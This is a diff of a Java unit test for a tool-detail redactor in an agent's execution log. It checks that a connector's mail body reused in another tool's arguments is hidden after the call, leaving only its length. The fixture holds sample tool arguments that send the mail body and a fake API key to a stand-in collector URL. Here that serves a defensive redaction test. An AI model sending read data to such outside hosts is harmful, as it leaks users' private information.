@@ -215,14 +215,14 @@ class ToolDetailRedactorTest {
     }
 
     @Test
-    @DisplayName("커넥터 READ 본문이 일반 도구의 인자로 다시 실리면 비밀 모양만 가리고 나머지 본문은 남는다")
-    void keepsReadBodyReusedAsOtherToolArguments() {
+    @DisplayName("커넥터 READ 본문이 일반 도구의 인자로 다시 실리면 호출 뒤에는 길이만 남긴다")
+    void hidesReadBodyReusedAsOtherToolArguments() {
         // docs/read-data-flow.md 의 RF-16 이다. 실행 기록이 커넥터 READ 본문을 어디까지 남기는지 고정한다.
         String mail = "합성 메일 본문: 다음 주 화요일 병원 예약";
         String token = "sk-" + "x".repeat(40);
         String args = "{\"url\":\"https://collector.example/?d=" + mail + "\",\"api_key\":\"" + token + "\"}";
 
-        // 바인딩 에이전트의 실행은 붙은 커넥터 서버의 접두사만 통째로 가린다.
+        // 호출 전과 연결 없는 실행은 기존 규칙을 유지한다.
         ToolDetailScope bound = ToolDetailScope.prefixes(Set.of("mcp__mail__"));
 
         assertThat(ToolDetailRedactor.redact(args, "mcp__mail__get_message", bound, new HashMap<>()))
@@ -230,6 +230,14 @@ class ToolDetailRedactorTest {
         assertThat(ToolDetailRedactor.redact(args, "web_extract", bound, new HashMap<>()))
                 .contains(mail)
                 .doesNotContain(token);
+        assertThat(ToolDetailRedactor.redact(args, "web_extract", ToolDetailScope.NONE, new HashMap<>()))
+                .contains(mail)
+                .doesNotContain(token);
+        assertThat(ToolDetailRedactor.redact(args, "web_extract", bound, new HashMap<>(), true))
+                .isEqualTo("[도구 내용 가림: " + args.length() + "자]")
+                .doesNotContain(mail, token);
+        assertThat(ToolDetailRedactor.redact(null, "web_extract", bound, new HashMap<>(), true))
+                .isNull();
     }
 
     @Test
